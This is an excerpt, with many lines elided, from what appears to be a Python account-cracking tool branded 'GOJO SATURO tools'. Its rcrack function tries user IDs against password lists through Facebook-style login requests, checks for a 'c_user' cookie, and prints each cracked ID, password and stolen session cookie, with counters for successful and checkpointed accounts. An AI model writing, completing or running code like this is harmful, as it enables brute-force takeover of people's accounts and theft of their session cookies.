...
os.system('espeak -a 300 "welcomed to GOJO SATURO tools"')
logo =(""""
...
def rcrack(uid,pwx,tl):
    ...
    try:
      ...
      # 'cookie': 'datr=u5oCZvYxUVSy8f0h0_F6vBWH; sb=u5oCZmT4wgy_UJWTF1V2vNYH; ps_l=0; ps_n=0',
          'dpr': '2.625',
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[GOJO-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[GOJOX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}GOJO{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
